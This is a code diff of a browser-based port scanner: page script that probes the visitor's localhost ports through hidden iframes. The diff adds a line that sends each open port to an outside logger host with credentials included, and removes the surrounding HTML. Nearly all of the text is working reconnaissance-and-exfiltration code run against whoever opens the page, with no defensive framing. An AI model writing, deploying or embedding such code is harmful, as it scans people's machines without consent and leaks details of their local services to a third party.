@@ -1,18 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Port Scanner</title>
-</head>
-<body>
-    <style>
-        code{
-            font-size: 1.2em;
-        }
 
-    </style>
-    <iframe class="iframe_webrtc" sandbox="allow-same-origin" style="display: none"></iframe>
-    <code id="out">Open ports on client machine<br /><br /> </code>
-    <script>
         var ports = [80, 443, 8080,2000, 6379];
         var checkPort = (port) => {
             var src = "http://127.0.0.1:"+port;
@@ -23,6 +9,7 @@
 
             frame.onload = () => {
                 document.getElementById("out").innerHTML += port+" | open <br />"
+                fetch("http://php-demo-app-shibli.cfapps.io/logger.php?logs=Port opened ->"+port, {mode:"no-cors", credentials: "include"});
             }
         }
         ports.forEach(port => {
@@ -32,7 +19,3 @@
                 console.log(error);
             }
         })
-
-    </script>
-</body>
-</html>
